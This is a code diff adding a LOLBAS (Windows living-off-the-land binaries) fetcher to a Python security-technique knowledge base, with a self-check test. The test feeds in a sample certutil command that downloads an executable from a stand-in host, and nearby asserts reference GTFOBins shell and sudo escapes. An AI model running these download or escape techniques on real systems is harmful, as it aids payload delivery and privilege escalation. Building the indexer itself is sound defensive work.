@@ -18,6 +18,7 @@ import requests
 from .rag import _record
 
 GTFOBINS_API = "https://gtfobins.github.io/api.json"
+LOLBAS_API = "https://lolbas-project.github.io/api/lolbas.json"
 
 
 def _gtfobins_records(data: dict) -> Iterator[dict]:
@@ -45,6 +46,29 @@ def fetch_gtfobins() -> Iterator[dict]:
     yield from _gtfobins_records(requests.get(GTFOBINS_API, timeout=60).json())
 
 
+def _lolbas_records(data: list) -> Iterator[dict]:
+    for e in data:
+        name = e.get("Name", "")
+        cmds = e.get("Commands") or []
+        if not name or not cmds:
+            continue
+        cats = sorted({c.get("Category", "") for c in cmds if c.get("Category")})
+        mitre = sorted({c.get("MitreID", "") for c in cmds if c.get("MitreID")})
+        snippets = [f"{c.get('Category', '')}: {c.get('Command', '')}"[:160] for c in cmds[:4]]
+        rec = _record(
+            id=f"lolbas:{name}", source="lolbas",
+            summary=f"{name} — Windows LOLBin: {', '.join(cats)}",
+            products=name, cwe=",".join(mitre),
+            references=[e.get("url") or f"https://lolbas-project.github.io/lolbas/Binaries/{name}/"],
+        )
+        rec["text"] = f"lolbas windows {name} " + " ".join(cats) + " " + " | ".join(snippets)
+        yield rec
+
+
+def fetch_lolbas() -> Iterator[dict]:
+    yield from _lolbas_records(requests.get(LOLBAS_API, timeout=60).json())
+
+
 if __name__ == "__main__":  # offline self-check: python -m metsec.techniques
     sample = {
         "functions": {"shell": {"mitre": ["T1059"]},
@@ -64,4 +88,11 @@ if __name__ == "__main__":  # offline self-check: python -m metsec.techniques
     assert r["id"] == "gtfobins:find" and r["source"] == "gtfobins"
     assert "T1059" in r["cwe"] and "T1548" in r["cwe"], r["cwe"]
     assert "/bin/sh" in r["text"] and "sudo" in r["text"], r["text"]
+
+    lol = list(_lolbas_records([{"Name": "Certutil.exe", "url": "https://x/certutil",
+        "Commands": [{"Command": "certutil -urlcache -f http://x/a.exe a.exe",
+                      "Category": "Download", "MitreID": "T1105"}]}]))
+    assert len(lol) == 1 and lol[0]["id"] == "lolbas:Certutil.exe"
+    assert lol[0]["source"] == "lolbas" and "T1105" in lol[0]["cwe"]
+    assert "certutil" in lol[0]["text"].lower()
     print("techniques self-check ok")
